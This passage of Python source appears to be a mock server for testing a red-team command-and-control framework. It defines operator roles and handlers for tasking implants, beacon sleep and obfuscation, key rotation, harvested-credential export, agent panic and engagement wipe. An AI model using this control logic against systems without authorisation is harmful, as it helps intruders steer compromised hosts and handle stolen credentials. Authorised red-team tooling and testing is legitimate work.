        "schedule.list": "viewer",
        "task.submit": "operator",
        "task.cancel": "operator",
        "task.retry": "operator",
        "events.list": "viewer",
        "engagement.wipe": "admin",
        "sessions.list": "viewer",
        "task.bulk": "operator",
        "task.chain": "operator",
        "alerts.list": "viewer",
        "agents.kill": "operator",
        "agents.exit": "operator",
        "agents.sleep": "operator",
        "agents.policy": "operator",
        "agents.tag": "operator",
        "chat.send": "operator",
        "schedule.add": "operator",
        "task.claim": "operator",
        "task.release": "operator",
        # Handing a task to a colleague orders human work as well.
        "task.assign": "operator",
        "operators.focus": "operator",
        # The workflow layer: writing and running a workflow is operator
        # work, watching one is harmless.
        "workflow.list": "viewer",
        "workflow.status": "viewer",
        "workflow.add": "operator",
        "workflow.remove": "operator",
        "workflow.run": "operator",
        # The quiet window is an admin decision; reading the queue is
        # harmless; the priority of a task is the operator's call.
        "server.quiet": "admin",
        # The credentials of the server itself.
        "keys.rotate": "admin",
        "tokens.rotate": "admin",
        "tokens.list": "viewer",
        "server.queue": "viewer",
        "task.priority": "operator",
        "schedule.remove": "admin",
        "events.test": "admin",
        # The server-side file store: reading it is harmless, filling it
        # and pushing its contents to a host is an operator action.
        "artifact.list": "viewer",
        "artifact.get": "viewer",
        "artifact.put": "operator",
        "artifact.remove": "operator",
        "artifact.push": "operator",
        # A panic ends the engagement on the target side.
        "agents.panic": "admin",
        # The route of an agent: reading it is harmless, changing it
        # changes how the implant reaches the server.
        "transport.get": "viewer",
        "transport.list": "viewer",
        "transport.set": "operator",
        "pivot.list": "viewer",
        "pivot.open": "operator",
        "pivot.close": "operator",
        "pivot.claim": "viewer",
        "pivot.release": "operator",
        "vpn.status": "viewer",
        "vpn.peers": "viewer",
        "vpn.allocate": "operator",
        "vpn.routes": "viewer",
        "vpn.route": "operator",
        "vpn.ping": "operator",
        "armory.list": "viewer",
        "armory.search": "viewer",
        "armory.needs": "viewer",
        "armory.versions": "viewer",
        "armory.resolve": "viewer",
        "armory.install": "operator",
        "armory.import": "operator",
        "armory.run": "operator",
        "armory.remove": "admin",
        "alias.list": "viewer",
        "alias.run": "operator",
        # The namespace is shared: the team writes the aliases everybody
        # uses, and the trail says who wrote what.
        "alias.add": "operator",
        "alias.remove": "operator",
        "team.sync": "viewer",
        # The handover document only reads the engagement.
        "team.handover": "viewer",
        "stager.generate": "admin",
    }

    def _claim_state(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """The state of the claim of a task.

        The claim lives as long as the operator that holds it keeps its
        presence: a console that died releases the task.
        """
        holder = str(task.get("claimed_by", "") or "")
        if not holder:
            return {}
        now = time.time()
        with self._lock:
            live = self.op_sessions.get(holder)
        alive = live is not None and (now - live.get("last_seen", now)) < CLAIM_LEASE
        claimed_at = float(task.get("claimed_at", now) or now)
        return {
            "claimed_age": int(max(0.0, now - claimed_at)),
            "claim_state": "live" if alive else "expired",
            "claim_expires_at": int(claimed_at + CLAIM_LEASE),
        }

    def min_role(self, cmd: str) -> str:
        return self.REQUIREMENTS.get(cmd, "admin")

    def allowed(self, role: str, cmd: str) -> bool:
        return self.ROLE_RANK.get(role, 0) >= self.ROLE_RANK.get(self.min_role(cmd), 99)

    def _due_schedules(self) -> None:
        """Fire recurring tasks; the mock uses the same rules as the hub."""
        now = time.time()
        fired = []
        with self._lock:
            for sc in self.schedules.values():
                if sc["next_run"] > now:
                    continue
                sc["next_run"] = now + sc["every"]
                sc["runs"] += 1
                fired.append(dict(sc))
        for sc in fired:
            with self._lock:
                agent = self.agents.get(sc["agent_id"])
                if agent is None:
                    continue
                # A burned agent takes no new work, and an agent that
                # advertised its capabilities is never asked for a kind it
                # cannot run: the same rule the Go server applies.
                if agent.get("panicked"):
                    continue
                caps = list(agent.get("caps") or [])
                if caps and sc["kind"] not in caps:
                    continue
                task = {
                    "id": new_id("t"),
                    "agent_id": sc["agent_id"],
                    "kind": sc["kind"],
                    "args": sc["args"],
                    "state": "queued",
                    "code": 0,
                    "out": b"",
                    "err": "",
                    "created": _now(),
                }
                self.tasks[task["id"]] = task
                sc["last_task"] = task["id"]
            self.emit("schedule.fired", sc["agent_id"], task_id=task["id"],
                      data={"schedule_id": sc["id"], "kind": sc["kind"]})

    def dispatch(self, req: Dict[str, Any], operator: str = "mock", peer: str = "") -> Dict[str, Any]:
        """Handle one RPC and record it in the in-memory audit trail."""
        started = time.monotonic()
        resp = self._handle(req, operator)
        entry = {
            "at": _now(),
            "operator": operator,
            "peer": peer,
            "transport": "tcp/operator",
            "cmd": str(req.get("cmd", "")),
            "ok": bool(resp.get("ok")),
            "err": str(resp.get("err", "")),
            "agent_id": str((req.get("args") or {}).get("id", "")),
            "task_id": str((req.get("args") or {}).get("task_id", "")
                           or (resp.get("data") or {}).get("task_id", "")),
            "detail": " ".join(f"{k}={v}" for k, v in sorted((req.get("args") or {}).items())),
            "ms": int((time.monotonic() - started) * 1000),
        }
        with self._lock:
            self.audit_entries.append(entry)
            if len(self.audit_entries) > 2000:
                del self.audit_entries[:1000]
        return resp

    def _handle(self, req: Dict[str, Any], operator: str = "mock") -> Dict[str, Any]:
        rid = req.get("rid", 0)
        cmd = str(req.get("cmd", ""))
        args = req.get("args") or {}
        resp: Dict[str, Any] = {"rid": rid, "ok": False, "data": {}}

        def ok(data: Dict[str, Any]) -> Dict[str, Any]:
            resp["ok"] = True
            resp["data"] = data
            return resp

        def fail(msg: str) -> Dict[str, Any]:
            resp["err"] = msg
            return resp

        role = self.roles.get(operator, "operator")
        scopes = self.token_scopes.get(operator, [])
        # The scopes narrow the role; they never widen it.  The wildcard
        # means "no narrowing", so the role alone decides.
        if scopes and cmd not in scopes and "*" not in scopes:
            return fail(
                f"permission denied: {cmd!r} is not in your scopes (role {role})"
            )
        if not self.allowed(role, cmd):
            return fail(
                f"permission denied: {cmd!r} requires role {self.min_role(cmd)} (you are {role})"
            )
        self.token_last_used[operator] = time.time()

        if cmd == "ping":
            return ok({"pong": _now()})

        if cmd == "keys.rotate":
            target = str(args.get("target", "agent") or "agent").strip()
            if target not in ("agent", "agent_psk", "psk"):
                return fail(
                    f"keys.rotate: unknown target {target!r} "
                    "(want agent, or use tokens.rotate for an operator)"
                )
            try:
                fresh = self.rotate_agent_psk(
                    str(args.get("psk", "") or "") or None
                )
            except ValueError as exc:
                return fail(f"keys.rotate: {exc}")
            self.emit("keys.rotated", operator,
                      data={"target": "agent", "overlap": int(self.key_overlap)})
            return ok({
                "target": "agent",
                # The new key is a text: the operator copies it into the
                # configuration of the beacons.
                "psk": fresh,
                "overlap": int(self.key_overlap),
                "note": "the previous key still works for the overlap; "
                        "give the new key to the beacons",
            })

        if cmd == "tokens.rotate":
            name = str(args.get("operator", "") or args.get("name", "") or "").strip()
            if not name:
                return fail("tokens.rotate: an operator is required")
            # The role is only changed when the caller says so.
            role = str(args.get("role", "") or self.roles.get(name, "operator"))
            if role not in self.ROLE_RANK:
                return fail(f"tokens.rotate: unknown role {role!r}")
            scopes = args.get("scopes") or []
            if isinstance(scopes, str):
                scopes = [s.strip() for s in scopes.split(",") if s.strip()]
            scopes = sorted({str(s) for s in scopes})
            for scope in scopes:
                if scope != "*" and scope not in self.REQUIREMENTS:
                    return fail(f"tokens.rotate: unknown command {scope!r} in the scopes")
            expires = float(args.get("expires_at", 0) or 0)
            token = str(args.get("token", "") or "")
            if token and len(token) < 16:
                return fail("tokens.rotate: the token must be at least 16 characters")
            fresh = self.rotate_token(name, role, scopes, expires, token or None)
            self.emit("token.rotated", operator,
                      data={"target": name, "role": role})
            return ok({
                "operator": name,
                "role": role,
                "scopes": scopes,
                "expires": int(expires),
                "token": fresh,
                "overlap": int(self.key_overlap),
                "note": "the previous token still works for the overlap",
            })

        if cmd == "tokens.list":
            rows = self.token_state()
            return ok({"tokens": rows, "count": len(rows)})

        if cmd == "whoami":
            scopes = self.token_scopes.get(operator, [])
            caps = sorted(c for c in self.REQUIREMENTS if self.allowed(role, c))
            if scopes:
                caps = sorted(c for c in caps if c in scopes or "*" in scopes)
            return ok(
                {
                    "name": operator,
                    "role": role,
                    "scopes": list(scopes),
                    "peer": "127.0.0.1:0",
                    "transport": "tcp/operator",
                    "since": _now(),
                    "focus": (self.op_sessions.get(operator) or {}).get("focus", ""),
                    "capabilities": caps,
                }
            )

        if cmd == "chat.send":
            text = str(args.get("text", "")).strip()
            if not text:
                return fail("chat.send needs non-empty text")
            to = str(args.get("to", "") or "").strip()
            with self._lock:
                if to and to not in self.op_sessions:
                    return fail(f"chat.send: {to!r} is not a connected operator")
                message = {"from": operator, "role": role, "text": text[:2000], "at": _now()}
                if to:
                    message["to"] = to
                mentions = _parse_mentions(text)
                if mentions:
                    message["mentions"] = mentions
                self.chat.append(message)
                del self.chat[:-200]
            self.emit("chat", data=dict(message), to=to, sender=operator)
            out = {"at": message["at"], "from": operator}
            if to:
                out["to"] = to
            return ok(out)

        if cmd == "chat.history":
            limit = int(args.get("limit", 50) or 50)
            with self._lock:
                return ok({"messages": [dict(m) for m in self.chat[-limit:]]})

        if cmd == "chat.operators":
            # Who is in the channel: the consoles, what they are working
            # on and how long they have been quiet.
            now = time.time()
            rows = []
            with self._lock:
                for name, live in sorted(self.op_sessions.items()):
                    idle = int(max(0.0, now - live.get("last_seen", now)))
                    rows.append({
                        "name": name,
                        "role": live.get("role", ""),
                        "focus": live.get("focus", ""),
                        "focus_at": live.get("focus_at", ""),
                        "idle_sec": idle,
                        "silent": idle >= PRESENCE_TTL,
                        "stale": idle >= CLAIM_LEASE,
                        "since": live.get("since", ""),
                        "transport": live.get("transport", ""),
                        "expires_at": int(now - idle + PRESENCE_TTL),
                    })
            return ok({"operators": rows, "count": len(rows)})

        if cmd == "schedule.add":
            agent_id = str(args.get("id", ""))
            kind = str(args.get("kind", ""))
            every = int(args.get("every", 0) or 0)
            with self._lock:
                if agent_id not in self.agents:
                    return fail(f"schedule.add: unknown agent {agent_id!r}")
                if every < 5 or every > 86400:
                    return fail("schedule.add: interval out of range")
                schedule = {
                    "id": new_id("s"),
                    "agent_id": agent_id,
                    "kind": kind,
                    "args": args.get("args") or {},
                    "every": every,
                    "enabled": True,
                    "runs": 0,
                    "next_run": time.time() + every,
                    "created": _now(),
                    "last_task": "",
                    "by": operator,
                }
                self.schedules[schedule["id"]] = schedule
            self.emit("schedule.created", agent_id, data={"schedule_id": schedule["id"]})
            return ok(
                {
                    "schedule_id": schedule["id"],
                    "agent_id": agent_id,
                    "kind": kind,
                    "every": every,
                    "next_run": int(schedule["next_run"]),
                }
            )

        if cmd == "schedule.list":
            with self._lock:
                items = [dict(sc) for sc in self.schedules.values()]
            return ok({"schedules": items})

        if cmd == "schedule.remove":
            schedule_id = str(args.get("schedule_id", ""))
            with self._lock:
                if schedule_id not in self.schedules:
                    return fail(f"schedule.remove: unknown schedule {schedule_id!r}")
                del self.schedules[schedule_id]
            self.emit("schedule.removed", data={"schedule_id": schedule_id})
            return ok({"schedule_id": schedule_id, "removed": True})

        if cmd == "server.stats":
            with self._lock:
                return ok(
                    {
                        "agents_total": len(self.agents),
                        "agents_online": sum(
                            1 for a in self.agents.values() if a["state"] == "online"
                        ),
                        "tasks_total": len(self.tasks),
                        "tasks_pending": sum(
                            1 for t in self.tasks.values() if t["state"] in ("queued", "delivered")
                        ),
                        "operators": len(self.subscribers),
                        "schedules": len(self.schedules),
                        "protocol": "umbra/v1",
                        "note": "mock server (test double)",
                    }
                )

        if cmd == "operators.list":
            with self._lock:
                backlog: Dict[str, int] = {}
                for name, q in self.subscribers:
                    backlog[name] = backlog.get(name, 0) + q.qsize()
                now = time.time()
                ops = []
                for i, (name, live) in enumerate(sorted(self.op_sessions.items())):
                    idle = int(max(0.0, now - live.get("last_seen", now)))
                    ops.append(
                        {
                            "id": i + 1,
                            "name": name,
                            "role": live.get("role", ""),
                            # The scopes of the token, when it has any.
                            "scopes": list(self.token_scopes.get(name, [])),
                            "peer": live.get("peer", ""),
                            "transport": live.get("transport", ""),
                            "since": live.get("since", ""),
                            "backlog": backlog.get(name, 0),
                            "focus": live.get("focus", ""),
                            "focus_at": live.get("focus_at", ""),
                            "idle_sec": idle,
                            # The presence expires: a console that stopped
                            # talking is silent, and after the lease it is
                            # stale and holds no claim any more.
                            "silent": idle >= PRESENCE_TTL,
                            "stale": idle >= CLAIM_LEASE,
                            "expires_at": int(now - idle + PRESENCE_TTL),
                        }
                    )
            return ok({"operators": ops, "count": len(ops)})

        if cmd == "agents.list":
            with self._lock:
                rows = [dict(a) for a in self.agents.values()
                        if _agent_matches(a, args)]
            return ok({"agents": rows, "count": len(rows)})

        if cmd in ("creds.list", "creds.search", "creds.export"):
            agent = str(args.get("agent", "") or "")
            kind = str(args.get("kind", "") or "")
            query = str(args.get("query", "") or "")
            if cmd == "creds.search" and not query.strip():
                return fail("creds.search needs a query")
            needle = query.strip().lower()
            with self._lock:
                rows = []
                for record in self.credentials:
                    if agent and record["agent_id"] != agent:
                        continue
                    if kind and record["kind"] != kind:
                        continue
                    if needle:
                        hay = " ".join([
                            record["account"], record["target"], record["source"],
                            record["kind"], record["note"], record["agent_id"],
                        ]).lower()
                        if needle not in hay:
                            continue
                    row = dict(record)
                    if cmd != "creds.export":
                        row["secret"] = ""
                    rows.append(row)
            return ok({"credentials": rows, "count": len(rows),
                       "encrypted": True})

        if cmd == "agents.tag":
            tags = _string_list(args.get("tags") or args.get("tag"))
            if not tags:
                return fail("agents.tag needs at least one tag")
            mode = str(args.get("mode", "add") or "add")
            if mode not in ("add", "remove", "set"):
                return fail("agents.tag: mode must be add, remove or set")
            if not _has_targets(args):
                return fail("agents.tag: no targets")
            targets = _select_agents(self.agents, args)
            updated = []
            with self._lock:
                for rec in targets:
                    current = [str(t) for t in rec.get("tags", [])]
                    if mode == "set":
                        current = list(tags)
                    elif mode == "remove":
                        current = [t for t in current if t not in tags]
                    else:
                        for tag in tags:
                            if tag not in current:
                                current.append(tag)
                    rec["tags"] = sorted(current)
                    updated.append(rec["id"])
            self.emit("agent.tags", updated[0] if updated else "",
                      data={"tags": tags, "mode": mode})
            return ok({"updated": updated, "tags": tags, "mode": mode})

        if cmd == "agents.policy":
            if "sleep" not in args or "jitter" not in args:
                return fail("agents.policy needs numeric sleep and jitter")
            sleep = int(args.get("sleep"))
            jitter = int(args.get("jitter"))
            obfuscate = args.get("obfuscate")
            if not _has_targets(args):
                return fail("agents.policy: no targets")
            targets = _select_agents(self.agents, args)
            updated = []
            with self._lock:
                for rec in targets:
                    rec["sleep"] = sleep
                    rec["jitter"] = jitter
                    if isinstance(obfuscate, bool):
                        rec["obfuscate"] = obfuscate
                    updated.append(rec["id"])
            for agent_id in updated:
                self.emit("agent.policy", agent_id,
                          data={"sleep": sleep, "jitter": jitter})
            out = {"updated": updated, "sleep": sleep, "jitter": jitter}
            if isinstance(obfuscate, bool):
                out["obfuscate"] = obfuscate
            return ok(out)

        if cmd == "agents.info":
            with self._lock:
                rec = self.agents.get(str(args.get("id", "")))
                if rec is None:
                    return fail("unknown agent")
                data = dict(rec)
                data["tasks"] = [dict(t) for t in self.tasks.values() if t["agent_id"] == rec["id"]][-20:]
                return ok(data)

        if cmd == "task.submit":
            agent_id = str(args.get("id", ""))
            kind = str(args.get("kind", ""))
            if self.quiet:
                return fail("the server is in its quiet window")
            problem = self._refusal(agent_id, kind)
            if problem:
                return fail(problem)
            try:
                deadline = _parse_deadline(args.get("deadline"))
                timeout = _parse_timeout(args.get("timeout"))
            except ValueError as exc:
                return fail("task.submit: %s" % exc)
            task = self._queue_task(agent_id, kind, args.get("args") or {},
                                    deadline=deadline, timeout=timeout)
            return ok({"task_id": task["id"], "agent_id": agent_id,
                       "state": task["state"]})

        if cmd == "task.get":
            with self._lock:
                task = self.tasks.get(str(args.get("task_id", "")))
                if task is None:
                    return fail("unknown task")
                snapshot = dict(task)
            row = _task_out(snapshot)
            row.update(self._claim_state(snapshot))
            return ok(row)

        if cmd == "task.list":
            agent_id = str(args.get("id", ""))
            kind = str(args.get("kind", "") or "")
            state = str(args.get("state", "") or "")
            assigned = str(args.get("assigned", "") or "")
            limit = int(args.get("limit", 50))
            with self._lock:
                items = [t for t in self.tasks.values()
                         if (not agent_id or t["agent_id"] == agent_id)
                         and (not kind or t["kind"] == kind)
                         and (not state or t["state"] == state)
                         and (not assigned or t.get("assigned_to", "") == assigned)]
            rows = []
            for task in items[-limit:]:
                row = _task_out(task)
                row.update(self._claim_state(task))
                rows.append(row)
            return ok({"tasks": rows, "count": len(rows)})

        if cmd == "task.assign":
            # Handing a task to a colleague: the assignment is not a
            # claim, it says who is expected to work on the task.
            task_id = str(args.get("task_id", ""))
            to = str(args.get("to", "") or "").strip()
            with self._lock:
                task = self.tasks.get(task_id)
                if task is None:
                    return fail("task.assign: no such task")
                if to and to not in self.op_sessions:
                    return fail(f"task.assign: {to!r} is not a connected operator")
                if task.get("state") in ("done", "failed", "cancelled"):
                    return fail(f"task.assign: task {task_id} is already {task['state']}")
                if to:
                    task["assigned_to"] = to
                    task["assigned_at"] = _now()
                else:
                    task.pop("assigned_to", None)
                    task.pop("assigned_at", None)
                snapshot = dict(task)
            # The event is broadcast: the whole team sees who passed what
            # to whom, and the colleague finds it in their inbox.
            self.emit("task.assigned", snapshot["agent_id"], task_id=task_id,
                      data={"assigned_to": to, "assigned_by": operator})
            return ok({"task_id": task_id, "assigned_to": to, "assigned_by": operator})

        if cmd == "task.bulk":
            kind = str(args.get("kind", "") or "")
            if not kind:
                return fail("task.bulk needs a task kind")
            task_args = args.get("args") or {}
            if not _has_targets(args):
                return fail("task.bulk: no targets")
            targets = _select_agents(self.agents, args)
            rows = []
            skipped = []
            for rec in targets:
                agent_id = rec["id"]
                # A host that cannot run the kind (or that was burned) is
                # reported instead of being queued a task it will refuse.
                problem = self._refusal(agent_id, kind)
                if problem:
                    skipped.append({"agent_id": agent_id, "err": problem})
                    continue
                task = self._queue_task(agent_id, kind, task_args)
                rows.append({"agent_id": agent_id, "task_id": task["id"],
                             "state": "queued"})
            return ok({"tasks": rows, "count": len(rows), "skipped": skipped})

        if cmd == "server.quiet":
            # The maintenance window: the beacons keep checking in and get
            # nothing, and nothing new is queued.
            on = args.get("on")
            if on is None:
                on = True
            self.quiet = bool(on)
            until = int(args.get("until", 0) or 0)
            self.quiet_until = until if self.quiet else 0
            answer: Dict[str, Any] = {"quiet": self.quiet}
            if self.quiet_until:
                answer["until"] = self.quiet_until
            return ok(answer)

        if cmd == "server.queue":
            with self._lock:
                dead = [{"task_id": t["id"], "agent_id": t["agent_id"],
                         "kind": t["kind"], "attempts": int(t.get("attempts", 0) or 0),
                         "err": t.get("err", ""), "trace_id": t.get("trace_id", "")}
                        for t in self.tasks.values() if t.get("state") == "dead"]
            with self._lock:
                counts = {"queued": 0, "delivered": 0, "done": 0, "failed": 0,
                          "dead": 0}
                for task in self.tasks.values():
                    state = str(task.get("state", ""))
                    if state in counts:
                        counts[state] += 1
                breakers = sum(1 for value in self.breakers.values()
                               if value >= BREAKER_THRESHOLD)
            return ok({
                "pending": counts["queued"] + counts["delivered"],
                "done": counts["done"],
                "failed": counts["failed"],
                "dead": counts["dead"],
                "quiet": bool(self.quiet),
                "breakers_open": breakers,
                "max_in_flight_per_agent": 4,
                "max_deliver_per_minute_per_agent": 60,
                "max_deliver_per_second": 200,
                "max_attempts": MAX_ATTEMPTS,
                "breaker_threshold": BREAKER_THRESHOLD,
                "breaker_cooldown_s": 60,
                "dead_letter": dead,
                "dead_letter_count": len(dead),
            })

        if cmd == "task.priority":
            task_id = str(args.get("task_id", "") or "")
            try:
                priority = int(args.get("priority", 0) or 0)
            except (TypeError, ValueError):
                return fail("task.priority needs a numeric priority")
            with self._lock:
                task = self.tasks.get(task_id)
                if task is None:
                    return fail(f"there is no task called {task_id!r}")
                task["priority"] = priority
            return ok({"task_id": task_id, "priority": priority})

        if cmd == "workflow.list":
            with self._lock:
                workflows = [dict(w) for w in self.workflows.values()]
                runs = [dict(r) for r in
                        sorted(self.workflow_runs.values(),
                               key=lambda r: r.get("started", ""), reverse=True)][:20]
            return ok({"workflows": workflows, "count": len(workflows), "runs": runs})

        if cmd == "workflow.add":
            name = str(args.get("name", "") or "").strip()
            if not name:
                return fail("workflow.add needs a name")
            steps = args.get("steps") or []
            if not isinstance(steps, list) or not steps:
                return fail("workflow.add needs at least one step")
            for step in steps:
                if not isinstance(step, dict) or not step.get("kind"):
                    return fail("workflow.add: a step needs a kind")
            params = args.get("params") or []
            if isinstance(params, str):
                params = [p.strip() for p in params.split(",") if p.strip()]
            workflow = {
                "name": name,
                "description": str(args.get("description", "") or ""),
                "params": list(params),
                "steps": steps,
                "created_by": operator,
                "created": _now(),
                "runs": 0,
            }
            with self._lock:
                self.workflows[name] = workflow
            self.emit("workflow.created", data={"workflow": name,
                                                "steps": len(steps)},
                      sender=operator)
            return ok({"workflow": workflow})

        if cmd == "workflow.remove":
            name = str(args.get("name", "") or "").strip()
            with self._lock:
                if name not in self.workflows:
                    return fail(f"workflow.remove: there is no workflow called {name!r}")
                self.workflows.pop(name, None)
            self.emit("workflow.removed", data={"workflow": name}, sender=operator)
            return ok({"removed": name})

        if cmd == "workflow.run":
            name = str(args.get("name", "") or "").strip()
            with self._lock:
                workflow = self.workflows.get(name)
            if workflow is None:
                return fail(f"workflow.run: there is no workflow called {name!r}")
            params = args.get("params") or {}
            if not isinstance(params, dict):
                params = {}
            params = {str(k): str(v) for k, v in params.items()}
            missing = [p for p in workflow.get("params", [])
                       if not str(params.get(p, "")).strip()]
            if missing:
                return fail("workflow.run: the workflow needs parameters: "
                            + ", ".join(missing))
            with self._lock:
                self._workflow_seq += 1
                run_id = f"wfrun{self._workflow_seq:04d}"
            run = {
                "id": run_id,
                "workflow": name,
                "state": "queued",
                "params": params,
                "started": _now(),
                "by": operator,
                "steps": [],
                "current": 0,
            }
            with self._lock:
                self.workflow_runs[run_id] = run
            self.emit("workflow.started", data={"workflow": name, "run": run_id},
                      sender=operator)
            thread = threading.Thread(target=self._run_workflow,
                                      args=(run_id, workflow, params), daemon=True)
            thread.start()
            self._threads.append(thread)
            return ok({"run_id": run_id, "run": dict(run)})

        if cmd == "workflow.status":
            run_id = str(args.get("run_id", "") or "").strip()
            with self._lock:
                run = self.workflow_runs.get(run_id)
            if run is None:
                return fail(f"workflow.status: there is no run called {run_id!r}")
            return ok({"run": dict(run)})

        if cmd == "task.chain":
            agent_id = str(args.get("id", "") or "")
            stages = args.get("stages") or []
            if not isinstance(stages, list) or not stages:
                return fail("task.chain: a chain needs at least one stage")
            first = stages[0]
            problem = self._refusal(agent_id, str(first.get("kind", "")))
            if problem:
                return fail(problem)
            with self._lock:
                if agent_id not in self.agents:
                    return fail(f"unknown agent {agent_id!r}")
                chain_id = new_id("chain")
                self.chains[chain_id] = {
                    "id": chain_id,
                    "agent_id": agent_id,
                    "stages": [dict(stage) for stage in stages],
                    "stage": 0,
                }
            task = self._queue_task(agent_id, str(first.get("kind", "")),
                                    first.get("args") or {})
            with self._lock:
                task["chain_id"] = chain_id
                task["stage"] = 0
            self.emit("chain.started", agent_id, task_id=task["id"],
                      data={"chain": chain_id, "stages": len(stages)})
            return ok({"chain_id": chain_id, "task_id": task["id"],
                       "agent_id": agent_id, "stages": len(stages),
                       "state": task["state"]})

        if cmd == "alerts.list":
            rules = self.alerts
            return ok({"alerts": rules, "count": len(rules)})

        if cmd in ("task.claim", "task.release"):
            task_id = str(args.get("task_id", ""))
            with self._lock:
                task = self.tasks.get(task_id)
                if task is None:
                    return fail(f"{cmd}: no such task")
                holder = str(task.get("claimed_by", ""))
                if cmd == "task.claim":
                    if task.get("state") in ("done", "failed", "cancelled"):
                        return fail(f"task.claim: task {task_id} is already {task['state']}")
                    if holder and holder != operator:
                        return fail(f"task.claim: task {task_id} is claimed by {holder}")
                    if not holder:
                        task["claimed_by"] = operator
                        task["claimed_at"] = _now()
                else:
                    if holder and holder != operator:
                        return fail(f"task.release: task {task_id} is claimed by {holder}")
                    task.pop("claimed_by", None)
                    task.pop("claimed_at", None)
                snapshot = dict(task)
            kind = "task.claimed" if cmd == "task.claim" else "task.released"
            self.emit(kind, snapshot["agent_id"], task_id=task_id, data={"by": operator})
            return ok(
                {
                    "task_id": task_id,
                    "agent_id": snapshot["agent_id"],
                    "claimed_by": snapshot.get("claimed_by", ""),
                    "state": snapshot.get("state", ""),
                }
            )

        if cmd == "operators.focus":
            agent_id = str(args.get("id", ""))
            with self._lock:
                if agent_id and agent_id not in self.agents:
                    return fail(f"operators.focus: unknown agent {agent_id!r}")
                presence = self.op_sessions.get(operator)
                if presence is None:
                    return fail(f"operators.focus: {operator!r} is not connected")
                previous = presence.get("focus", "")
                presence["focus"] = agent_id
                presence["focus_at"] = _now() if agent_id else ""
            self.emit(
                "operator.focus",
                data={"operator": operator, "agent_id": agent_id},
                sender=operator,
            )
            return ok({"operator": operator, "agent_id": agent_id, "previous": previous})

        if cmd == "task.cancel":
            task_id = str(args.get("task_id", ""))
            with self._lock:
                task = self.tasks.get(task_id)
                if task is None:
                    return fail("unknown task")
                # Same rule as the Go server: a finished or already cancelled
                # task cannot be cancelled again.
                if task["state"] in ("done", "failed", "cancelled"):
                    return fail(f"task {task_id!r} cannot be cancelled")
                previous = task["state"]
                task["state"] = "cancelled"
                agent_id = task["agent_id"]
                if previous == "delivered":
                    queue = self.pending_cancels.setdefault(agent_id, [])
                    if len(queue) < 4:
                        queue.append(task_id)
            self.emit("task.cancelled", agent_id, task_id=task_id, data={"was": previous})
            return ok({"task_id": task_id, "state": "cancelled"})

        if cmd == "engagement.wipe":
            # The end of an engagement: the record of the machines that
            # were touched stops existing on the server.
            with self._lock:
                agents = len(self.agents)
                tasks = len(self.tasks)
                schedules = len(self.schedules)
                self.agents.clear()
                self.tasks.clear()
                self.schedules.clear()
                self.open_sessions.clear()
            self.emit("engagement.wiped", data={"agents": agents, "tasks": tasks,
                                                "schedules": schedules})
            return ok({"agents": agents, "tasks": tasks, "schedules": schedules})

        if cmd == "sessions.list":
            with self._lock:
                rows = [dict(row) for row in self.open_sessions.values()]
            rows.sort(key=lambda row: row.get("last", 0), reverse=True)
            return ok({"sessions": rows, "count": len(rows)})

        if cmd == "events.list":
            after = int(args.get("after", 0) or 0)
            limit = int(args.get("limit", 100) or 100)
            with self._lock:
                rows = [dict(e) for e in self.events if int(e.get("seq", 0)) > after]
            if limit > 0 and len(rows) > limit:
                rows = rows[-limit:]
            last = int(rows[-1].get("seq", 0)) if rows else after
            return ok({"events": rows, "count": len(rows), "seq": last})

        if cmd == "task.retry":
            task_id = str(args.get("task_id", ""))
            with self._lock:
                task = self.tasks.get(task_id)
                if task is None:
                    return fail("unknown task")
                if task["state"] in ("queued", "delivered"):
                    return fail(f"task {task_id!r} has not finished yet")
                agent_id = task["agent_id"]
                kind = task["kind"]
                task_args = dict(task.get("args") or {})
            new_task = self._queue_task(agent_id, kind, task_args)
            return ok({"task_id": new_task["id"], "agent_id": agent_id,
                       "kind": kind, "retried": task_id})

        if cmd == "audit.tail":
            # The mock keeps the same append-only JSONL format in memory so the
            # CLI path can be exercised without a Go server.
            limit = int(args.get("limit", 50) or 50)
            with self._lock:
                entries = list(self.audit_entries)[-limit:][::-1]
            return ok({"entries": entries, "enabled": True})

        if cmd == "agents.sleep":
            agent_id = str(args.get("id", ""))
            sleep = int(args.get("sleep", self.sleep))
            jitter = int(args.get("jitter", self.jitter))
            with self._lock:
                if agent_id not in self.agents:
                    return fail("unknown agent")
                self.agents[agent_id]["sleep"] = sleep
                self.agents[agent_id]["jitter"] = jitter
            self.emit("agent.policy", agent_id, data={"sleep": sleep, "jitter": jitter})
            return ok({"id": agent_id, "sleep": sleep, "jitter": jitter})

        if cmd in ("agents.kill", "agents.exit"):
            agent_id = str(args.get("id", ""))
            problem = self._refusal(agent_id, "exit")
            if problem:
                return fail(problem)
            task = self._queue_task(agent_id, "exit", {})
            return ok({"task_id": task["id"], "agent_id": agent_id})

        if cmd == "agents.panic":
            # The end of an engagement on the target side: the beacon is
            # told to exit and the agent refuses every further task.
            #
            # "all" is the deliberate override of the selection rule and it
            # reaches the agents that are asleep as well: the exit command
            # is delivered on their next check-in.
            if bool(args.get("all")):
                with self._lock:
                    targets = [dict(rec) for rec in self.agents.values()]
            else:
                if not _has_targets(args):
                    return fail("agents.panic: no targets")
                targets = _select_agents(self.agents, args)
            if not targets:
                return fail("agents.panic: no agents matched")
            panicked = []
            skipped = []
            for rec in targets:
                agent_id = rec.get("id", "")
                if rec.get("panicked"):
                    skipped.append(agent_id)
                    continue
                problem = self._refusal(agent_id, "exit")
                if problem:
                    skipped.append(agent_id)
                    continue
                # The exit command goes first: a burned agent refuses every
                # task, including the one that shuts it down.
                self._queue_task(agent_id, "exit", {})
                with self._lock:
                    record = self.agents.get(agent_id)
                    if record is not None:
                        record["panicked"] = True
                panicked.append(agent_id)
            self.emit("agent.panic", data={"agents": panicked})
            return ok({"panicked": panicked, "count": len(panicked),
                       "skipped": skipped})

        # ---- the server-side file store ----------------------------------
        if cmd == "artifact.list":
            with self._lock:
                rows = [
                    {
                        "name": rec["name"],
                        "sha256": rec["sha256"],
                        "size": rec["size"],
                        "created": rec["created"],
                        "updated": rec["updated"],
                    }
                    for rec in sorted(self.artifacts.values(),
                                      key=lambda r: r["name"])
                ]
            return ok({"artifacts": rows, "count": len(rows)})

        if cmd == "artifact.put":
            # The upload is chunked: the frames are bounded, so a file
            # arrives as a series of appends at increasing offsets.  The last
            # chunk carries "eof" and is the one that writes the blob.
            name = str(args.get("name", ""))
            if not name:
                return fail("artifact.put needs a name")
            data = args.get("data") or b""
            if isinstance(data, str):
                data = data.encode()
            data = bytes(data)
            offset = int(args.get("offset", 0) or 0)
